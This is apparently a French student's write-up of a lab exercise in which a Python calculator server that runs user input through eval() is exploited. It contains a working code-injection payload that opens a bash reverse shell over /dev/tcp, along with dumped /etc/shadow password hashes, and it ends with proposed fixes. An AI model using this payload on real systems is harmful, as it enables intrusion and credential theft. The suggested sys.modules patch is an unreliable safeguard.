# TP5 SECU : Exploit, pwn, fix

Encore un TP de dév, mais où vous ne développez pas ! Pas mal nan ?

Le but : **exploiter un code vulnérable et proposer des remédiations** pour qu'il ne le soit plus.

La mise en situation est assez proche d'un cas réel, en restant dans des conditions de TP.

> **Pour maximiser le fun, ne discutez de rien de tout ça ni avec les dévs, ni avec les infras**, restez dans votre secte de sécu :D Si tu joues le jeu c'est un exercice cool, moins tu le jeu, plus il est nul !

![Gunna be hax](./img/gunna_be_hacker.png)

## Sommaire

- [TP5 SECU : Exploit, pwn, fix](#tp5-secu--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [0. Setup](#0-setup)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 0. Setup

➜ **Je vous filerai un lien en cours pour télécharger le client d'une application**

- pas possible de commencer le TP tant que j'ai rien donné donc, attendez le feu vert !

➜ Votre but : 🏴‍☠️ **prendre le contrôle du serveur** 🏴‍☠️

## 1. Reconnaissance

> ***Cette section est en grande partie uniquement réalisable en cours. Perdez pas de temps.***

➜ On a de la chance dis donc ! Du Python pas compilé !

- prenez le temps de lire le code
- essayez de le lancer et de capter à quoi il sert

🌞 **Déterminer**

Grace à une capture wireshark je peux voir que le programe essaye de se conecter a l'ip 10.1.1.2 sur le port 13337


[voici la capture wireshark](./tcp.pcapng)

🌞 **Scanner le réseau**



🌞 **Connectez-vous au serveur**

```bash
nico@debian:~/Documents/Resaux-B2$ /bin/python3 /home/nico/Documents/Resaux-B2/Tp5/client.py
Veuillez saisir une opération arithmétique : 10+8
'18'
```

c'est une calculette

## 2. Exploit

➜ **On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.**

Ca doit lever un giga red flag dans votre esprit de hacker ça. Tu saisis ce que tu veux, et le serveur le lit et l'interprète.

🌞 **Injecter du code serveur**

voici un ls sur le serveur

```bash
nico@debian:~/Documents/Resaux-B2$ /bin/python3 /home/nico/Documents/Resaux-B2/Tp5/client.py
'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
```

## 3. Reverse shell


🌞 **Obtenez un reverse shell sur le serveur**

sur un premier shell j'écoute le port 1111

```bash
PS C:\Users\nicop> ncat -lvp 1111
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.1.1.11:60606.
bash: cannot set terminal process group (1434): Inappropriate ioctl for device
bash: no job control in this shell
[root@localhost /]#
```

sur un autre je me connect au server grace a ncat et j'inject du code
```bash

PS C:\Users\nicop> ncat 10.1.1.11 13337
lkjh$
Hello__import__('os').popen('bash -i >& /dev/tcp/10.1.1.1/1111 0>&1').read()

```


🌞 **Pwn**

`/etc/shadow`:
```bash
root:$6$glQgzdEr8vm6uc23$6jS7IevTizLCm4Je1rBMKLGA8eFXwPHMR2xfzkzkBrmVVdRJvoR.XRfyUZJYf6N8WvIHRr8kL/mvzakVjWOgd1::0:99999:7:::
bin:*:19453:0:99999:7:::
daemon:*:19453:0:99999:7:::
adm:*:19453:0:99999:7:::
lp:*:19453:0:99999:7:::
sync:*:19453:0:99999:7:::
shutdown:*:19453:0:99999:7:::
halt:*:19453:0:99999:7:::
mail:*:19453:0:99999:7:::
operator:*:19453:0:99999:7:::
games:*:19453:0:99999:7:::
ftp:*:19453:0:99999:7:::
nobody:*:19453:0:99999:7:::
systemd-coredump:!!:19816::::::
dbus:!!:19816::::::
tss:!!:19816::::::
sssd:!!:19816::::::
chrony:!!:19816::::::
sshd:!!:19816::::::
systemd-oom:!*:19816::::::
nico:$6$SVO8KK00OeQx2yZ9$NZMblD1oOTqa4ws.nJa6OoMCIVIHknuqrEnMcVqKV8QjJWfzTM0qCEISH2JD8P9bEnMTtQ/2c2PsxN4Hxz76E.::0:99999:7:::
``` 


`/etc/passwd` 

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
nico:x:1000:1000:nico:/home/nico:/bin/bash
```
- voler le code serveur de l'application

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 13337))

s.listen(1)
conn, addr = s.accept()

while True:

    try:
        # On re├ºoit la string Hello du client
        data = conn.recv(1024)
        if not data: break
        print(f"Donn├®es re├ºues du client : {data}")

        conn.send("Hello".encode())

        # On re├ºoit le calcul du client
        data = conn.recv(1024)
        data = data.decode().strip("\n")

        # Evaluation et envoi du r├®sultat
        res  = eval(data)
        conn.send(str(res).encode())

    except socket.error:
        print("Error Occured.")
        break

conn.close()
```

- déterminer si d'autres services sont disponibles sur la machine

```bash
[root@localhost /]# ss -alntupe
ss -alntupe
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess

udp   UNCONN 0      0          127.0.0.1:323        0.0.0.0:*    users:(("chronyd",pid=678,fd=5)) ino:19267 sk:1 cgroup:/system.slice/chronyd.service <->
udp   UNCONN 0      0              [::1]:323           [::]:*    users:(("chronyd",pid=678,fd=6)) ino:19268 sk:2 cgroup:/system.slice/chronyd.service v6only:1 <->
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=717,fd=3)) ino:19803 sk:3 cgroup:/system.slice/sshd.service <->
tcp   LISTEN 0      1            0.0.0.0:13337      0.0.0.0:*    users:(("python3",pid=11115,fd=3)) ino:32686 sk:4 cgroup:/system.slice/calc.service <->
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=717,fd=4)) ino:19812 sk:5 cgroup:/system.slice/sshd.service v6only:1 <->
[root@localhost /]#

```

à part le serveur aucun service anormale ne troune 


## II. Remédiation

🌞 **Proposer une remédiation dév**

suprimer eval on peut exécuter le code phyton que l'on veut avec donc le remplacer par 🌞literal_eval🌞
définir dans le code des imports que l'on veut interdire:
```python
import sys
sys.modules['os'].system = None
```




🌞 **Proposer une remédiation système**

creer un autre user pour faire tourner le code du serveur pour pas qu'il tourne en root sur la machine

déffinir un parfeux pour bloquer les sorti du serveur sauf réponse utile exemple les pings